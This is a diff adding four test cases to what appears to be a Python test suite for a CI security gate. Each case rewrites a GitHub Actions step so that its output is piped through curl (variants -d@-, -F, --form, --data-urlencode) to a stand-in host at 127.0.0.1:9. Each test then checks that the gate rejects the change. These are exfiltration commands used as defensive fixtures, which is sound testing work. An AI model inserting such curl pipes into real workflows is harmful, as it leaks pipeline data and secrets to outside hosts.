@@ -3459,6 +3459,82 @@ def main():
         periksa("chroot tabel opsi: gerbang gagal (Audit 1084)", rc != 0)
         shutil.rmtree(sub171, ignore_errors=True)
 
+        sub172 = klon(tmp, "sub172")
+        berkas_aksi172 = os.path.join(
+            sub172, ".github", "actions", "resolve-vw",
+            "action.yml")
+        with open(berkas_aksi172, encoding="utf-8") as f:
+            isi_aksi172 = f.read()
+        baris_aksi172 = [b for b in isi_aksi172.splitlines()
+                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
+        with open(berkas_aksi172, "w", encoding="utf-8") as f:
+            f.write(isi_aksi172.replace(
+                baris_aksi172,
+                baris_aksi172.replace(
+                    '>> "$GITHUB_OUTPUT"',
+                    "> >(curl -d@- http://127.0.0.1:9/x; cat >> \"$GITHUB_OUTPUT\")"), 1))
+        rc, out = jalan(sub172,
+                        [sys.executable, GERBANG, "--semua"])
+        periksa("curl -d@- merekat: gerbang gagal (Audit 1085)", rc != 0)
+        shutil.rmtree(sub172, ignore_errors=True)
+
+        sub173 = klon(tmp, "sub173")
+        berkas_aksi173 = os.path.join(
+            sub173, ".github", "actions", "resolve-vw",
+            "action.yml")
+        with open(berkas_aksi173, encoding="utf-8") as f:
+            isi_aksi173 = f.read()
+        baris_aksi173 = [b for b in isi_aksi173.splitlines()
+                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
+        with open(berkas_aksi173, "w", encoding="utf-8") as f:
+            f.write(isi_aksi173.replace(
+                baris_aksi173,
+                baris_aksi173.replace(
+                    '>> "$GITHUB_OUTPUT"',
+                    "> >(curl -F a=@- http://127.0.0.1:9/x; cat >> \"$GITHUB_OUTPUT\")"), 1))
+        rc, out = jalan(sub173,
+                        [sys.executable, GERBANG, "--semua"])
+        periksa("curl -F a=@-: gerbang gagal (Audit 1085)", rc != 0)
+        shutil.rmtree(sub173, ignore_errors=True)
+
+        sub174 = klon(tmp, "sub174")
+        berkas_aksi174 = os.path.join(
+            sub174, ".github", "actions", "resolve-vw",
+            "action.yml")
+        with open(berkas_aksi174, encoding="utf-8") as f:
+            isi_aksi174 = f.read()
+        baris_aksi174 = [b for b in isi_aksi174.splitlines()
+                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
+        with open(berkas_aksi174, "w", encoding="utf-8") as f:
+            f.write(isi_aksi174.replace(
+                baris_aksi174,
+                baris_aksi174.replace(
+                    '>> "$GITHUB_OUTPUT"',
+                    "> >(curl --form a=@- http://127.0.0.1:9/x; cat >> \"$GITHUB_OUTPUT\")"), 1))
+        rc, out = jalan(sub174,
+                        [sys.executable, GERBANG, "--semua"])
+        periksa("curl --form a=@-: gerbang gagal (Audit 1085)", rc != 0)
+        shutil.rmtree(sub174, ignore_errors=True)
+
+        sub175 = klon(tmp, "sub175")
+        berkas_aksi175 = os.path.join(
+            sub175, ".github", "actions", "resolve-vw",
+            "action.yml")
+        with open(berkas_aksi175, encoding="utf-8") as f:
+            isi_aksi175 = f.read()
+        baris_aksi175 = [b for b in isi_aksi175.splitlines()
+                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
+        with open(berkas_aksi175, "w", encoding="utf-8") as f:
+            f.write(isi_aksi175.replace(
+                baris_aksi175,
+                baris_aksi175.replace(
+                    '>> "$GITHUB_OUTPUT"',
+                    "> >(curl --data-urlencode name@- http://127.0.0.1:9/x; cat >> \"$GITHUB_OUTPUT\")"), 1))
+        rc, out = jalan(sub175,
+                        [sys.executable, GERBANG, "--semua"])
+        periksa("curl urlencode name@-: gerbang gagal (Audit 1085)", rc != 0)
+        shutil.rmtree(sub175, ignore_errors=True)
+
         umpanbak = klon(tmp, "umpanbak")
         berkas_ub = os.path.join(umpanbak, ".github", "actions",
                                  "resolve-vw", "action.yml")
